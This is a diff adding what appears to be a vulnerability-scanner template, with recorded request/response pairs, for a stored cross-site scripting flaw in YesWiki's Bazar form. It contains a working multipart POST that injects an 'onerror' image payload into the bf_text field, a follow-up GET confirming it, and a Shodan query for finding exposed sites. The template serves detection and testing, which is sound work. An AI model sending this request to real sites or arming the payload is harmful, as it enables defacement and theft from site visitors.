@@ -1,0 +1,69 @@
+id: yeswiki-stored-xss
+info:
+  name: YesWiki - Stored Cross-Site Scripting
+  author: arafatansari
+  description: 'YesWiki contains a stored contains a cross-site scripting vulnerability
+    via the bf_text field when adding a new entry for Forum.
+
+    '
+  severity: high
+  reference:
+  - https://huntr.dev/bounties/5f27a9b1-c092-47e2-8092-a81298a4b932/
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
+    cvss-score: 7.2
+    cwe-id: CWE-79
+  metadata:
+    verified: true
+    max-request: 2
+    shodan-query: http.html:"yeswiki"
+  tags: yeswiki,xss,stored-xss,huntr,intrusive
+traps:
+- request:
+    method: POST
+    path: /?BazaR&vue=saisir&action=saisir_fiche&id=2
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryT8dS2PT0WtxACLyu
+    body: |
+      ------WebKitFormBoundaryT8dS2PT0WtxACLyu
+      Content-Disposition: form-data; name="bf_titre"
+
+      blog
+      ------WebKitFormBoundaryT8dS2PT0WtxACLyu
+      Content-Disposition: form-data; name="bf_text"
+
+      "><img src=x onerror=console.log(123);>
+      ------WebKitFormBoundaryT8dS2PT0WtxACLyu
+      Content-Disposition: form-data; name="file"; filename=""
+      Content-Type: application/octet-stream
+
+      ------WebKitFormBoundaryT8dS2PT0WtxACLyu
+      Content-Disposition: form-data; name="bf_description"
+
+      abcd
+      ------WebKitFormBoundaryT8dS2PT0WtxACLyu
+      Content-Disposition: form-data; name="fichierbf_file"; filename=""
+      Content-Type: application/octet-stream
+
+      ------WebKitFormBoundaryT8dS2PT0WtxACLyu
+      Content-Disposition: form-data; name="antispam"
+
+      1
+      ------WebKitFormBoundaryT8dS2PT0WtxACLyu
+      Content-Disposition: form-data; name="id_typeannonce"
+
+      2
+      ------WebKitFormBoundaryT8dS2PT0WtxACLyu--
+  response:
+    status_code: 200
+    headers: {}
+    body: ''
+- request:
+    method: GET
+    path: /?BazaR&vue=consulter
+    headers: {}
+    body: ''
+  response:
+    status_code: 200
+    headers: {}
+    body: '><img src=x onerror=console.log(123);>'
